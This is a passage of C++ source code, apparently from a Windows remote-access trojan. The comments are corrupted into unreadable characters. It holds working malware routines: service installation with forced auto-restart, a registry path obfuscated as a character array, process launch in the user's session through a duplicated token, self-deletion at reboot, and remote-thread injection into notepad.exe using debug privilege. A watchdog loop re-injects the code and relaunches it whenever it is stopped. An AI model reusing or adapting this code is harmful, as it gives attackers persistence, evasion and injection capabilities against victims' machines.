                if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING) //��������Ѿ����йرշ�����
                {
                    m_gFunc.CloseServiceHandle(schSCManager);  
                    m_gFunc.CloseServiceHandle(schService);
                    return TRUE;
                }
            }
            else
            {
                return TRUE;
            }
            while(m_gFunc.QueryServiceStatus(schService,&ServiceStatus)!=0)           
            {
                if(ServiceStatus.dwCurrentState==SERVICE_START_PENDING)
                {
                    m_gFunc.Sleep(100);
                }
                else
                {
                    break;
                }
            }
            m_gFunc.CloseServiceHandle(schService);
        }
        m_gFunc.CloseServiceHandle(schSCManager);
    }
    else
    {
		return FALSE;
    }
    return TRUE;
}

//ֹͣ����
BOOL NtStopService(LPCTSTR lpService)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	SERVICE_STATUS   RemoveServiceStatus;
	
	schSCManager = m_gFunc.OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//�򿪷�����ƹ��������ݿ�
	if (schSCManager!=NULL)
	{
		schService=m_gFunc.OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//��÷������ľ��
		if (schService!=NULL)
		{		
			if(m_gFunc.QueryServiceStatus(schService,&RemoveServiceStatus)!=0)
			{
				if(RemoveServiceStatus.dwCurrentState!=SERVICE_STOPPED)//ֹͣ����
				{
					if(m_gFunc.ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
					{
						while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
						{
							m_gFunc.Sleep(10);
							m_gFunc.QueryServiceStatus(schService,&RemoveServiceStatus);
						}
					}
				}
			}    
			m_gFunc.CloseServiceHandle(schService);
		}	
		m_gFunc.CloseServiceHandle(schSCManager);
	}
	else 
	{
		return FALSE;
	}

	return TRUE;
}


//��װ����
BOOL NtInstallService(LPCTSTR strServiceName, //��������
					  LPCTSTR strDisplayName, //������ʾ����
					  LPCTSTR strDescription, //��������
					  LPCTSTR strPathName,    //��ִ���ļ���·��
					  LPCTSTR Dependencies,   //ָ�������÷���ǰ�����������ķ���������,һ��ΪNULL
					  BOOLEAN KernelDriver,   //�Ƿ�װ��������
					  ULONG   StartType       //��������
					  )
{
    BOOL bRet = FALSE;
    SC_HANDLE svc=NULL, scm=NULL;
    __try
    {
        scm = m_gFunc.OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
        if (!scm)
		{
            return -1;
        }
		svc = m_gFunc.CreateService(
            scm, 
            strServiceName, 
            strDisplayName,
            SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
            KernelDriver ? SERVICE_KERNEL_DRIVER : SERVICE_WIN32_OWN_PROCESS| SERVICE_INTERACTIVE_PROCESS,
            StartType,
            SERVICE_ERROR_IGNORE,
            strPathName,
            NULL, NULL, Dependencies, NULL, NULL);
	
		SERVICE_FAILURE_ACTIONS sdBuf={0};
		m_gFunc.ChangeServiceConfig2(svc, SERVICE_CONFIG_DESCRIPTION, &sdBuf);
		sdBuf.lpRebootMsg=NULL;
		sdBuf.dwResetPeriod=NULL;
		
		SC_ACTION action[3];
		action[0].Delay=5000;
		action[0].Type=SC_ACTION_RESTART;
		action[1].Delay=0;
		action[1].Type=SC_ACTION_RESTART;
		action[2].Delay=0;
		action[2].Type=SC_ACTION_RESTART;
		sdBuf.cActions=3;
		sdBuf.lpsaActions=action;
		sdBuf.lpCommand=NULL;
		m_gFunc.ChangeServiceConfig2(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf);
		
 		m_gFunc.ChangeServiceConfig2(svc,SERVICE_CONFIG_DESCRIPTION,&sdBuf);

		if (svc == NULL)
        {
            if (m_gFunc.GetLastError() == ERROR_SERVICE_EXISTS)
            {
                svc = m_gFunc.OpenService(scm,strServiceName,SERVICE_ALL_ACCESS);
                if (svc==NULL)
                    __leave;
                else
                    m_gFunc.StartService(svc,0, 0);
            }
        }
		if (!m_gFunc.StartService(svc,0, 0))
            __leave;

		char str[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
		// "SYSTEM\\CurrentControlSet\\Services\\%s"
        TCHAR Desc[MAX_PATH];
        m_gFunc.wsprintfA(Desc,str, strServiceName);

		WriteRegEx(HKEY_LOCAL_MACHINE, 
			Desc, 
			"Description", 
			REG_SZ, 
			(char*)strDescription, 
			lstrlen(strDescription), 
			0);			
        bRet = TRUE;
    }
    __finally
    {
        if (svc!=NULL)
            m_gFunc.CloseServiceHandle(svc);
        if (scm!=NULL)
            m_gFunc.CloseServiceHandle(scm);
    }
	
    return bRet;
}
//ж�ط���
void NtUninstallService(LPCTSTR ServiceName)
{
	if (!lstrlen(ServiceName))
		return;

	NtStopService(ServiceName);

	SC_HANDLE scm,svc;

	scm=m_gFunc.OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (scm!=NULL)
	{
		svc=m_gFunc.OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
		if (svc!=NULL)
		{
			m_gFunc.DeleteService(svc);
			m_gFunc.CloseServiceHandle(svc);
		}
		m_gFunc.CloseServiceHandle(scm);
	}

	WriteRegEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
		ServiceName,
		NULL,
		NULL,
		NULL,
		3);
}

HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;
	HINSTANCE userenv = LoadLibrary("userenv.dll"); 
	typedef DWORD (WINAPI *CEB)(LPVOID *lpEnvironment,HANDLE hToken,BOOL bInherit);
	CEB  myCreateEnvironmentBlock= (CEB  )GetProcAddress(userenv,"CreateEnvironmentBlock");
	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";
	hProcess = m_gFunc.GetCurrentProcess();
	m_gFunc.OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	m_gFunc.DuplicateTokenEx(hExistingToken,  0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
	if (m_gFunc.WTSGetActiveConsoleSessionId)
	{
		TokenInformation = m_gFunc.WTSGetActiveConsoleSessionId();
		m_gFunc.SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
		myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
		//WTSQueryUserToken(TokenInformation,&hObject);
		m_gFunc.CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);
		hProcessInfo = ProcessInfo.hProcess;
		m_gFunc.CloseHandle(hObject);
		m_gFunc.CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}
	if(userenv)
		FreeLibrary(userenv);
	return result;
}

void DeleteSelf()
{
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];
	m_gFunc.GetModuleFileName(NULL,strServiceDll,sizeof(strServiceDll));
	m_gFunc.SHGetSpecialFolderPaths(NULL,strRandomFile,0x001c,FALSE);
	strcat(strRandomFile,"\\Temp");
	m_gFunc.wsprintfA(strRandomFile, "%s\\%d.exe",strRandomFile, GetTickCount());
	m_gFunc.MoveFile(strServiceDll, strRandomFile);
	m_gFunc.MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}


#include <vector>
#include <strsafe.h>
#define MAX_LENGTH 255

//Զ���̲߳����ṹ��
typedef struct _remoteTdParams
{
	LPVOID ZWinExec;             // WinExec Function Address
	LPVOID ZOpenProcess;         // OpenProcess Function Address
	LPVOID ZWaitForSingleObject; // WaitForSingleObject Function Address
	DWORD ZPid;                  // Param => Process id
	HANDLE ZProcessHandle;       // Param => Handle
	CHAR filePath[MAX_LENGTH];   // Param => File Path
}RemoteParam;

//�����̲߳����ṹ��
typedef struct _localTdParams
{
	CHAR remoteProcName[MAX_LENGTH];
	DWORD localPid;
	DWORD remotePid;
	HANDLE hRemoteThread;
}LocalParam;

//�ַ����ָ��
BOOL SplitString(const string& s, vector<string>& v, const string& c)
{
	string::size_type pos1, pos2;
	pos2 = s.find(c);
	pos1 = 0;
	while (string::npos != pos2)
	{
		v.push_back(s.substr(pos1, pos2 - pos1));

		pos1 = pos2 + c.size();
		pos2 = s.find(c, pos1);
	}
	if (pos1 != s.length())
		v.push_back(s.substr(pos1));
	return TRUE;
}


//Զ���̺߳����� (�ػ�����)
DWORD WINAPI ThreadProc(RemoteParam *lprp)
{
	typedef UINT(WINAPI *ZWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
	typedef HANDLE(WINAPI *ZOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
	typedef DWORD(WINAPI *ZWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
	ZWinExec ZWE;
	ZOpenProcess ZOP;
	ZWaitForSingleObject ZWFSO;
	ZWE = (ZWinExec)lprp->ZWinExec;
	ZOP = (ZOpenProcess)lprp->ZOpenProcess;
	ZWFSO = (ZWaitForSingleObject)lprp->ZWaitForSingleObject;
	lprp->ZProcessHandle = ZOP(PROCESS_ALL_ACCESS, FALSE, lprp->ZPid);
	ZWFSO(lprp->ZProcessHandle, INFINITE);
	ZWE(lprp->filePath, SW_SHOW);
	return 0;
}

//��ȡPID
DWORD __cdecl GetProcessID(CHAR *ProcessName)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;
	BOOL bProcess = Process32First(hProcessSnap, &pe32);
	while (bProcess)
	{
		if (strcmp(strupr(pe32.szExeFile), strupr(ProcessName)) == 0)
			return pe32.th32ProcessID;
		bProcess = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return 0;
}

//��ȡȨ��
int __cdecl EnableDebugPriv(const TCHAR *name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken)) return 1;
	if (!LookupPrivilegeValue(NULL, name, &luid)) return 1;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) return 1;
	return 0;
}

//�߳�ע�뺯��
BOOL __cdecl InjectProcess(const DWORD dwRemotePid, const DWORD dwLocalPid, HANDLE& hThread)
{
	if (EnableDebugPriv(SE_DEBUG_NAME)) return FALSE;
	HANDLE hWnd = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemotePid);
	if (!hWnd) return FALSE;
	RemoteParam rp;
	ZeroMemory(&rp, sizeof(RemoteParam));
	rp.ZOpenProcess = (LPVOID)GetProcAddress(LoadLibrary("Kernel32.dll"), "OpenProcess");
	rp.ZWinExec = (LPVOID)GetProcAddress(LoadLibrary("Kernel32.dll"), "WinExec");
	rp.ZWaitForSingleObject = (LPVOID)GetProcAddress(LoadLibrary("Kernel32.dll"), "WaitForSingleObject");
	rp.ZPid = dwLocalPid;
	CHAR szPath[MAX_LENGTH] = "\0";
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	StringCchCopy(rp.filePath, sizeof(rp.filePath), szPath);
	RemoteParam *pRemoteParam = (RemoteParam *)VirtualAllocEx(hWnd, 0, sizeof(RemoteParam), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteParam) return FALSE;
	if (!WriteProcessMemory(hWnd, pRemoteParam, &rp, sizeof(RemoteParam), 0)) return FALSE;
	LPVOID pRemoteThread = VirtualAllocEx(hWnd, 0, 1024 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteThread) return FALSE;
	if (!WriteProcessMemory(hWnd, pRemoteThread, &ThreadProc, 1024 * 4, 0)) return FALSE;
	hThread = CreateRemoteThread(hWnd, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, (LPVOID)pRemoteParam, 0, NULL);
	if (!hThread) return FALSE;
	return TRUE;
}

//Զ���̼߳�غ����������̺߳�����
DWORD WINAPI WatchFuncData(LPVOID lprarm)
{
	HANDLE hRemoteThread = ((LocalParam*)lprarm)->hRemoteThread;
	DWORD dwLocalPid = ((LocalParam*)lprarm)->localPid;
	DWORD dwRemotePid = ((LocalParam*)lprarm)->remotePid;
	CHAR szRemoteProcName[MAX_LENGTH] = "\0";
	StringCchCopy(szRemoteProcName, sizeof(szRemoteProcName), ((LocalParam*)lprarm)->remoteProcName);
	DWORD exitCode = 0;
	while (TRUE)
	{
		if (!hRemoteThread) InjectProcess(dwRemotePid, dwLocalPid, hRemoteThread);
		GetExitCodeThread(hRemoteThread, &exitCode);
		if (exitCode^STILL_ACTIVE)
		{
			WinExec(szRemoteProcName, SW_HIDE);
			dwRemotePid = GetProcessID(szRemoteProcName);
			InjectProcess(dwRemotePid, dwLocalPid, hRemoteThread);
		}
		Sleep(1000);
	}
	return 0;
}
extern DWORD __stdcall MainThread();
void ZhuRu()
{
	LocalParam lpLp;
	ZeroMemory(&lpLp, sizeof(LocalParam));
	CHAR szRemoteProcName[MAX_LENGTH] = "\0";
	CHAR szLocalProcName[MAX_LENGTH] = "\0";
	CHAR currentFilePath[MAX_LENGTH] = "\0";
	vector<string> pathGroup;
	GetModuleFileName(NULL, currentFilePath, sizeof(currentFilePath));
	SplitString(currentFilePath, pathGroup, "\\");
	StringCchCopy(szLocalProcName, sizeof(szLocalProcName), pathGroup[pathGroup.size() - 1].c_str());
	StringCchCopy(szRemoteProcName, sizeof(szRemoteProcName), "notepad.exe");
	StringCchCopy(szLocalProcName, sizeof(szLocalProcName), szLocalProcName);
	StringCchCopy(lpLp.remoteProcName, sizeof(lpLp.remoteProcName), szRemoteProcName);
	DWORD dwRemotePid = GetProcessID(szRemoteProcName);
	DWORD dwLocalPid = GetProcessID(szLocalProcName);
	HANDLE hThread = NULL;
	lpLp.remotePid = dwRemotePid;
	lpLp.localPid = dwLocalPid;
	hThread = CreateThread(NULL, 0, WatchFuncData, LPVOID(&lpLp), 0, 0);
	while (TRUE)
	{
		HANDLE hPS = OpenProcess(PROCESS_ALL_ACCESS,false,GetCurrentProcessId()); 
		SetPriorityClass(hPS,HIGH_PRIORITY_CLASS);//���ý������ȼ�
		CloseHandle(hPS); 
		MainThread();
	}
	WaitForSingleObject(hThread, INFINITE);
}
